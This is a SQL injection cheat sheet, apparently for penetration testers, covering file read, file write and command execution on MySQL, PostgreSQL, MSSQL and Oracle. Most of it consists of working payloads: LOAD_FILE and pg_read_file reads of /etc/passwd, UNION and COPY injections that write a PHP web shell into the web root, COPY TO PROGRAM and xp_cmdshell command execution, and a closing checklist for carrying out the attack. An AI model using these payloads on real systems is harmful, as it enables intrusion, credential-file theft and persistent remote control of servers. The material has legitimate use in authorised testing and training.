# SQL Injection - File Operations

## MySQL File Read/Write

### Requirements
```sql
-- Check secure_file_priv setting
SHOW VARIABLES LIKE 'secure_file_priv';
-- Empty = no restriction, NULL = disabled, path = restricted to that path
```

### File Read
```sql
' UNION SELECT LOAD_FILE('/etc/passwd'),2,3-- -
' UNION SELECT LOAD_FILE('C:/Windows/System32/drivers/etc/hosts'),2,3-- -
```

### File Write (Webshell)
```sql
' UNION SELECT '<?php system($_GET["c"]); ?>',2 INTO OUTFILE '/var/www/html/shell.php'-- -
' UNION SELECT '<?php system($_GET["c"]); ?>' INTO DUMPFILE '/var/www/html/shell.php'-- -
```

### Requirements for Write
- FILE privilege
- secure_file_priv not restrictive
- Web-writable directory known

## PostgreSQL File Operations

### File Read (requires superuser or pg_read_server_files role)
```sql
' UNION SELECT NULL,pg_read_file('/etc/passwd',0,10000)--
```

### Create Table from File
```sql
CREATE TABLE temp_data(line text);
COPY temp_data FROM '/etc/passwd';
SELECT * FROM temp_data;
```

### File Write / Command Exec (requires superuser)
```sql
COPY (SELECT '') TO PROGRAM 'touch /tmp/pwned';
COPY (SELECT '<?php system($_GET["c"]);?>') TO '/var/www/html/shell.php';
```

### RCE via Large Objects (lo_import/lo_export)
```sql
SELECT lo_import('/etc/passwd');
SELECT lo_export(loid, '/tmp/output');
```

## MSSQL File Operations

### File Read (via xp_cmdshell or OPENROWSET)
```sql
SELECT * FROM OPENROWSET(BULK 'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS Contents;
```

### Command Execution (xp_cmdshell)
```sql
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--
'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
'; EXEC xp_cmdshell 'whoami';--
```

### File Write
```sql
'; EXEC xp_cmdshell 'echo test > C:\inetpub\wwwroot\test.txt';--
```

## Oracle File Operations

### Read (needs UTL_FILE + directory object)
```sql
-- Requires DBA to create directory object first
SELECT UTL_FILE.FOPEN('DIR_NAME', 'file.txt', 'r') FROM dual;
```

### Command Exec (via Java stored procedures, needs privilege)
```sql
-- Requires custom Java stored procedure with DBMS_JAVA privileges
```

## Detection Checklist
```
1. Determine DB privileges (FILE priv for MySQL, superuser for PG, sysadmin for MSSQL)
2. Determine writable web directory
3. Determine DB engine's file function availability
4. Test read before attempting write
```
